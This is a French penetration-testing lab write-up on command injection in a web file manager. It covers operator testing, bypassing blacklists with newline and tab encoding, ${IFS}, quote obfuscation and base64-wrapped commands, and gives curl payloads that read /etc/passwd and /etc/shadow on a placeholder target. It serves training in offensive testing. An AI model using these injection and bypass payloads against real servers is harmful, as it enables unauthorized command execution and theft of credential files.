# Lab - Gestionnaire de fichiers

## Scénario

Lors d'un test d'intrusion, on tombe sur un gestionnaire de fichiers web accessible depuis le portail interne de l'entreprise. Ce type d'application est particulièrement intéressant pour les injections de commandes : en coulisses, les opérations de recherche, de déplacement et de renommage de fichiers passent souvent par des appels système directs (`find`, `mv`, `cp`). Si l'entrée utilisateur n'est pas correctement assainie avant d'être insérée dans ces commandes, on peut y glisser nos propres instructions.

L'objectif est d'identifier un point d'injection dans l'une des fonctionnalités du gestionnaire, de contourner les filtres de sécurité en place, puis d'exécuter des commandes arbitraires sur le serveur.

## Approche

La démarche suit une progression méthodique. On ne lance pas directement un payload complexe : on commence par comprendre le comportement de l'application, puis on identifie les protections actives avant de construire le contournement adapté.

**1. Reconnaissance de l'application**

Explorer chaque fonctionnalité du gestionnaire (recherche, tri, copie, déplacement, renommage, compression). Chacune de ces actions peut potentiellement déclencher une commande système côté serveur. Observer les requêtes HTTP dans Burp Suite pour identifier les paramètres transmis au back-end.

**2. Test des opérateurs d'injection**

Tester les opérateurs classiques un par un dans le champ identifié :

| Opérateur | Payload | Résultat attendu |
|---|---|---|
| Point-virgule | `test;id` | Les deux commandes s'exécutent |
| AND | `test&&id` | La seconde s'exécute si la première réussit |
| OR | `test\|\|id` | La seconde s'exécute si la première échoue |
| Retour à la ligne | `test%0aid` | Les deux commandes s'exécutent |
| Pipe | `test\|id` | Seule la sortie de la seconde est affichée |

**3. Identification des filtres**

Si tous les opérateurs classiques renvoient une erreur (« Invalid input » ou similaire), réduire le payload à un seul caractère à la fois pour déterminer lesquels sont bloqués. Le retour à la ligne (`%0a`) est souvent oublié dans les blacklists.

**4. Contournement des filtres de caractères**

Une fois l'opérateur fonctionnel trouvé, vérifier si l'espace et les autres caractères sont aussi filtrés. Remplacer les espaces par des tabulations (`%09`) ou la variable `${IFS}`.

**5. Contournement des filtres de commandes**

Si les commandes sont blacklistées, appliquer les techniques d'obfuscation : insertion de guillemets (`w'h'o'am'i`), variables d'environnement pour les caractères spéciaux (`${PATH:0:1}` pour `/`), ou encodage base64 pour contourner l'ensemble des filtres.

## Commandes

Depuis un conteneur Exegol, voici la progression type pour exploiter un gestionnaire de fichiers vulnérable :

```bash
# - Étape 1 : intercepter et tester un opérateur non filtré
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09id"
```

{% hint style="info" %}
Le retour à la ligne (`%0a`) suivi d'une tabulation (`%09`) est une combinaison efficace quand les opérateurs classiques (`;`, `&&`, `||`) et les espaces sont tous filtrés. C'est souvent le premier contournement à tester.
{% endhint %}

```bash
# - Étape 2 : obfusquer la commande si elle est blacklistée
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09w'h'o'am'i"
```

```bash
# - Étape 3 : utiliser des variables d'environnement pour les caractères bloqués
# - ${IFS} remplace l'espace, ${PATH:0:1} produit un /
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd"
```

```bash
# - Étape 4 : encodage base64 pour contourner tous les filtres d'un coup
# - La commande encodée ici est : cat /etc/passwd
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09bash<<<\$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)"
```

{% hint style="warning" %}
Chaque technique de contournement doit respecter les contraintes des filtres déjà identifiés. Si les espaces sont bloqués, le payload d'obfuscation ne doit pas en contenir non plus. C'est un piège classique : on contourne le filtre de commandes mais on oublie que le payload lui-même contient un caractère interdit.
{% endhint %}

```bash
# - Étape 5 : une fois l'exécution confirmée, passer aux commandes utiles
# - Lecture de fichiers sensibles
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09bash<<<\$(base64%09-d<<<Y2F0IC9ldGMvc2hhZG93)"

# - Identification de l'utilisateur et des privilèges
curl -s -X POST "http://<IP_CIBLE>:<PORT>/api/action" \
     -d "action=search&query=test%0a%09bash<<<\$(base64%09-d<<<aWQ=)"
```

## Ce qu'on en retient

{% hint style="success" %}
**Points clés de ce lab :**

- Les gestionnaires de fichiers web sont des cibles naturelles pour les injections de commandes, car ils manipulent le système de fichiers via des appels système directs
- L'approche incrémentale est essentielle : tester chaque caractère individuellement permet d'identifier précisément ce qui est filtré et ce qui ne l'est pas
- Le retour à la ligne (`%0a`) passe souvent entre les mailles des blacklists, car les développeurs pensent rarement à le bloquer
- Combiner plusieurs techniques (opérateur non filtré + remplacement des espaces + obfuscation des commandes) permet de contourner des protections multicouches
- L'encodage base64 reste la technique la plus polyvalente pour contourner les filtres de commandes et de caractères en une seule opération
- En conditions réelles, valider l'exécution avec une commande simple (`id`, `whoami`) avant de tenter des opérations plus complexes
{% endhint %}

***
